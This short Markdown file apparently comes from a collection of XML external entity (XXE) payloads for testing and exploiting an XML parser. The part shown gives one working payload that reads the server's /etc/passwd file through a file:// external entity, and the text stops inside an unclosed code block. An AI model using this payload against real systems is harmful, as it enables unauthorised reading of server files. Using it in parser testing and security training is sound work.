# XXE Payloads (`Payloads.md`)

Below are the payloads used to test and exploit the XML parser across different scenarios.

## 1. Local File Retrieval (`/etc/passwd`) — Primary Objective
This payload defines an external entity named `xxe` using the `file://` URI scheme to read the local `/etc/passwd` file and output it inside the `<root>` element.

```xml

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
